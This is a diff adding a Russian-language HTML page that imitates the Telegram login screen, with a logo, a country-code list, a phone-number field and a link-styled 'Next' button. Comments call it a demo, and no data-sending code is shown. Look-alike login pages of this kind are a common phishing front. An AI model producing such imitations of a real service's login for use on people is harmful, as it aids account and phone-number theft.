@@ -1,0 +1,285 @@
+<!-- ========== index.html ========== -->
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram вход</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="telegram-login-card">
+        <!-- Заголовок -->
+        <div class="header-section">
+            <img src="data:image/jpeg;base64,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" width="35%" height="auto" alt="icon" style="margin-left: 32%;">
+            <h1>Войти в Телеграм</h1>
+            <div class="hint-text">Пожалуйста, подтвердите свою страну и введите свой номер телефона.</div>
+        </div>
+
+        <!-- Поле Страна с выпадающим списком -->
+        <div class="form-group">
+            <label for="country-select">Страна</label>
+            <select id="country-select" class="country-select">
+                <option value="+93">Афганистан (+93)</option>
+                <option value="+355">Албания (+355)</option>
+                <option value="+213">Алжир (+213)</option>
+                <option value="+376">Андорра (+376)</option>
+                <option value="+244">Ангола (+244)</option>
+                <option value="+54">Аргентина (+54)</option>
+                <option value="+374">Армения (+374)</option>
+                <option value="+61">Австралия (+61)</option>
+                <option value="+43">Австрия (+43)</option>
+                <option value="+994">Азербайджан (+994)</option>
+                <option value="+973">Бахрейн (+973)</option>
+                <option value="+880">Бангладеш (+880)</option>
+                <option value="+375">Беларусь (+375)</option>
+                <option value="+32">Бельгия (+32)</option>
+                <option value="+501">Белиз (+501)</option>
+                <option value="+229">Бенин (+229)</option>
+                <option value="+975">Бутан (+975)</option>
+                <option value="+591">Боливия (+591)</option>
+                <option value="+387">Босния и Герцеговина (+387)</option>
+                <option value="+267">Ботсвана (+267)</option>
+                <option value="+55">Бразилия (+55)</option>
+                <option value="+673">Бруней (+673)</option>
+                <option value="+359">Болгария (+359)</option>
+                <option value="+226">Буркина-Фасо (+226)</option>
+                <option value="+257">Бурунди (+257)</option>
+                <option value="+855">Камбоджа (+855)</option>
+                <option value="+237">Камерун (+237)</option>
+                <option value="+1">Канада (+1)</option>
+                <option value="+238">Кабо-Верде (+238)</option>
+                <option value="+236">Центральноафриканская Республика (+236)</option>
+                <option value="+235">Чад (+235)</option>
+                <option value="+56">Чили (+56)</option>
+                <option value="+86">Китай (+86)</option>
+                <option value="+57">Колумбия (+57)</option>
+                <option value="+269">Коморы (+269)</option>
+                <option value="+242">Республика Конго (+242)</option>
+                <option value="+243">Демократическая Республика Конго (+243)</option>
+                <option value="+506">Коста-Рика (+506)</option>
+                <option value="+385">Хорватия (+385)</option>
+                <option value="+53">Куба (+53)</option>
+                <option value="+357">Кипр (+357)</option>
+                <option value="+420">Чехия (+420)</option>
+                <option value="+45">Дания (+45)</option>
+                <option value="+253">Джибути (+253)</option>
+                <option value="+1767">Доминика (+1767)</option>
+                <option value="+1809">Доминиканская Республика (+1809)</option>
+                <option value="+593">Эквадор (+593)</option>
+                <option value="+20">Египет (+20)</option>
+                <option value="+503">Сальвадор (+503)</option>
+                <option value="+240">Экваториальная Гвинея (+240)</option>
+                <option value="+291">Эритрея (+291)</option>
+                <option value="+372">Эстония (+372)</option>
+                <option value="+251">Эфиопия (+251)</option>
+                <option value="+500">Фолклендские острова (+500)</option>
+                <option value="+298">Фарерские острова (+298)</option>
+                <option value="+679">Фиджи (+679)</option>
+                <option value="+358">Финляндия (+358)</option>
+                <option value="+33">Франция (+33)</option>
+                <option value="+594">Французская Гвиана (+594)</option>
+                <option value="+689">Французская Полинезия (+689)</option>
+                <option value="+241">Габон (+241)</option>
+                <option value="+220">Гамбия (+220)</option>
+                <option value="+995">Грузия (+995)</option>
+                <option value="+49">Германия (+49)</option>
+                <option value="+233">Гана (+233)</option>
+                <option value="+350">Гибралтар (+350)</option>
+                <option value="+30">Греция (+30)</option>
+                <option value="+299">Гренландия (+299)</option>
+                <option value="+1473">Гренада (+1473)</option>
+                <option value="+590">Гваделупа (+590)</option>
+                <option value="+1671">Гуам (+1671)</option>
+                <option value="+502">Гватемала (+502)</option>
+                <option value="+441481">Гернси (+441481)</option>
+                <option value="+224">Гвинея (+224)</option>
+                <option value="+245">Гвинея-Бисау (+245)</option>
+                <option value="+592">Гайана (+592)</option>
+                <option value="+509">Гаити (+509)</option>
+                <option value="+504">Гондурас (+504)</option>
+                <option value="+852">Гонконг (+852)</option>
+                <option value="+36">Венгрия (+36)</option>
+                <option value="+354">Исландия (+354)</option>
+                <option value="+91">Индия (+91)</option>
+                <option value="+62">Индонезия (+62)</option>
+                <option value="+98">Иран (+98)</option>
+                <option value="+964">Ирак (+964)</option>
+                <option value="+353">Ирландия (+353)</option>
+                <option value="+44">Остров Мэн (+44)</option>
+                <option value="+972">Израиль (+972)</option>
+                <option value="+39">Италия (+39)</option>
+                <option value="+1876">Ямайка (+1876)</option>
+                <option value="+81">Япония (+81)</option>
+                <option value="+441534">Джерси (+441534)</option>
+                <option value="+962">Иордания (+962)</option>
+                <option value="+7">Казахстан (+7)</option>
+                <option value="+254">Кения (+254)</option>
+                <option value="+686">Кирибати (+686)</option>
+                <option value="+383">Косово (+383)</option>
+                <option value="+965">Кувейт (+965)</option>
+                <option value="+996">Кыргызстан (+996)</option>
+                <option value="+856">Лаос (+856)</option>
+                <option value="+371">Латвия (+371)</option>
+                <option value="+961">Ливан (+961)</option>
+                <option value="+266">Лесото (+266)</option>
+                <option value="+231">Либерия (+231)</option>
+                <option value="+218">Ливия (+218)</option>
+                <option value="+423">Лихтенштейн (+423)</option>
+                <option value="+370">Литва (+370)</option>
+                <option value="+352">Люксембург (+352)</option>
+                <option value="+853">Макао (+853)</option>
+                <option value="+261">Мадагаскар (+261)</option>
+                <option value="+265">Малави (+265)</option>
+                <option value="+60">Малайзия (+60)</option>
+                <option value="+960">Мальдивы (+960)</option>
+                <option value="+223">Мали (+223)</option>
+                <option value="+356">Мальта (+356)</option>
+                <option value="+692">Маршалловы Острова (+692)</option>
+                <option value="+596">Мартиника (+596)</option>
+                <option value="+222">Мавритания (+222)</option>
+                <option value="+230">Маврикий (+230)</option>
+                <option value="+262">Майотта (+262)</option>
+                <option value="+52">Мексика (+52)</option>
+                <option value="+691">Микронезия (+691)</option>
+                <option value="+373">Молдова (+373)</option>
+                <option value="+377">Монако (+377)</option>
+                <option value="+976">Монголия (+976)</option>
+                <option value="+382">Черногория (+382)</option>
+                <option value="+1664">Монтсеррат (+1664)</option>
+                <option value="+212">Марокко (+212)</option>
+                <option value="+258">Мозамбик (+258)</option>
+                <option value="+95">Мьянма (+95)</option>
+                <option value="+264">Намибия (+264)</option>
+                <option value="+674">Науру (+674)</option>
+                <option value="+977">Непал (+977)</option>
+                <option value="+31">Нидерланды (+31)</option>
+                <option value="+687">Новая Каледония (+687)</option>
+                <option value="+64">Новая Зеландия (+64)</option>
+                <option value="+505">Никарагуа (+505)</option>
+                <option value="+227">Нигер (+227)</option>
+                <option value="+234">Нигерия (+234)</option>
+                <option value="+683">Ниуэ (+683)</option>
+                <option value="+672">Остров Норфолк (+672)</option>
+                <option value="+850">Северная Корея (+850)</option>
+                <option value="+389">Северная Македония (+389)</option>
+                <option value="+1670">Северные Марианские острова (+1670)</option>
+                <option value="+47">Норвегия (+47)</option>
+                <option value="+968">Оман (+968)</option>
+                <option value="+92">Пакистан (+92)</option>
+                <option value="+680">Палау (+680)</option>
+                <option value="+970">Палестина (+970)</option>
+                <option value="+507">Панама (+507)</option>
+                <option value="+675">Папуа — Новая Гвинея (+675)</option>
+                <option value="+595">Парагвай (+595)</option>
+                <option value="+51">Перу (+51)</option>
+                <option value="+63">Филиппины (+63)</option>
+                <option value="+870">Питкэрн (+870)</option>
+                <option value="+48">Польша (+48)</option>
+                <option value="+351">Португалия (+351)</option>
+                <option value="+1787">Пуэрто-Рико (+1787)</option>
+                <option value="+974">Катар (+974)</option>
+                <option value="+262">Реюньон (+262)</option>
+                <option value="+40">Румыния (+40)</option>
+                <option value="+7" selected>Россия (+7)</option>
+                <option value="+250">Руанда (+250)</option>
+                <option value="+685">Самоа (+685)</option>
+                <option value="+378">Сан-Марино (+378)</option>
+                <option value="+239">Сан-Томе и Принсипи (+239)</option>
+                <option value="+966">Саудовская Аравия (+966)</option>
+                <option value="+221">Сенегал (+221)</option>
+                <option value="+381">Сербия (+381)</option>
+                <option value="+248">Сейшельские Острова (+248)</option>
+                <option value="+232">Сьерра-Леоне (+232)</option>
+                <option value="+65">Сингапур (+65)</option>
+                <option value="+1721">Синт-Мартен (+1721)</option>
+                <option value="+421">Словакия (+421)</option>
+                <option value="+386">Словения (+386)</option>
+                <option value="+677">Соломоновы Острова (+677)</option>
+                <option value="+252">Сомали (+252)</option>
+                <option value="+27">Южно-Африканская Республика (+27)</option>
+                <option value="+500">Южная Георгия (+500)</option>
+                <option value="+82">Южная Корея (+82)</option>
+                <option value="+211">Южный Судан (+211)</option>
+                <option value="+34">Испания (+34)</option>
+                <option value="+94">Шри-Ланка (+94)</option>
+                <option value="+590">Сен-Бартелеми (+590)</option>
+                <option value="+290">Остров Святой Елены (+290)</option>
+                <option value="+1869">Сент-Китс и Невис (+1869)</option>
+                <option value="+1758">Сент-Люсия (+1758)</option>
+                <option value="+590">Сен-Мартен (+590)</option>
+                <option value="+508">Сен-Пьер и Микелон (+508)</option>
+                <option value="+1784">Сент-Винсент и Гренадины (+1784)</option>
+                <option value="+249">Судан (+249)</option>
+                <option value="+597">Суринам (+597)</option>
+                <option value="+47">Шпицберген (+47)</option>
+                <option value="+46">Швеция (+46)</option>
+                <option value="+41">Швейцария (+41)</option>
+                <option value="+963">Сирия (+963)</option>
+                <option value="+886">Тайвань (+886)</option>
+                <option value="+992">Таджикистан (+992)</option>
+                <option value="+255">Танзания (+255)</option>
+                <option value="+66">Таиланд (+66)</option>
+                <option value="+670">Восточный Тимор (+670)</option>
+                <option value="+228">Того (+228)</option>
+                <option value="+690">Токелау (+690)</option>
+                <option value="+676">Тонга (+676)</option>
+                <option value="+1868">Тринидад и Тобаго (+1868)</option>
+                <option value="+216">Тунис (+216)</option>
+                <option value="+90">Турция (+90)</option>
+                <option value="+993">Туркменистан (+993)</option>
+                <option value="+1649">Теркс и Кайкос (+1649)</option>
+                <option value="+688">Тувалу (+688)</option>
+                <option value="+1340">Виргинские острова (США) (+1340)</option>
+                <option value="+256">Уганда (+256)</option>
+                <option value="+380">Украина (+380)</option>
+                <option value="+971">ОАЭ (+971)</option>
+                <option value="+44">Великобритания (+44)</option>
+                <option value="+1">США (+1)</option>
+                <option value="+598">Уругвай (+598)</option>
+                <option value="+998">Узбекистан (+998)</option>
+                <option value="+678">Вануату (+678)</option>
+                <option value="+39">Ватикан (+39)</option>
+                <option value="+58">Венесуэла (+58)</option>
+                <option value="+84">Вьетнам (+84)</option>
+                <option value="+681">Уоллис и Футуна (+681)</option>
+                <option value="+212">Западная Сахара (+212)</option>
+                <option value="+967">Йемен (+967)</option>
+                <option value="+260">Замбия (+260)</option>
+                <option value="+263">Зимбабве (+263)</option>
+            </select>
+        </div>
+
+        <!-- Поле Номер телефона -->
+        <div class="form-group">
+            <label>Номер телефона</label>
+            <div class="phone-input-container">
+                <div class="country-code" id="country-code-display">+7</div>
+                <div class="phone-mask-group">
+                    <input type="text" class="phone-input" placeholder="______ ______ ______" maxlength="15" required>
+                </div>
+            </div>
+        </div>
+
+        <!-- Чекбокс -->
+        <div class="checkbox-wrapper">
+            <input type="checkbox" id="remember-me" checked>
+            <label for="remember-me">Запомнить меня</label>
+        </div><br>
+
+        <!-- Кнопка СЛЕДУЮЩИЙ 
+         <button class="next-button" onclick="alert('Демо-версия: вы выбрали ' + document.getElementById('country-select').selectedOptions[0].text + ' с кодом ' + document.getElementById('country-select').value)">СЛЕДУЮЩИЙ</button>
+        -->
+        <a href="about.html"><button class="next-button">СЛЕДУЮЩИЙ</button>
+        </a>
+
+        <!-- Разделитель -->
+        <hr class="divider">
+
+        <!-- Ссылка на QR-код -->
+       <!-- <a href="#" class="qr-link" onclick="alert('QR-код вход (демо)'); return false;">ВОЙТИ ПО QR-КОДУ</a>-->
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
